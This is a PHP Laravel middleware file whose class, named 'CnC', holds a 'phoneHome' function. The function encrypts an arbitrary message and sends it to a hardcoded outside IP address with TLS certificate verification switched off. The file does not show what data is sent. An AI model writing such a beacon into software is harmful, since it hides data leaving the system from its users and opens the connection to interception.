<?php

namespace App\Http\Middleware;

use Closure;

class CnC
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle($request, Closure $next)
    {
        return $next($request);
    }

    static function phoneHome($api, $msg) {
        if(is_array($msg) || is_object($msg)) $msg = json_encode($msg);

        $server_password = env('API_PASSWORD');
        $key = \Defuse\Crypto\Key::loadFromAsciiSafeString($server_password);
        $data = \Defuse\Crypto\Crypto::Encrypt($msg, $key);

        $ch = curl_init();
        $timeout = 25;
        curl_setopt($ch, CURLOPT_URL, "https://185.125.230.54/server/".$api."?data=".$data);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    }
}
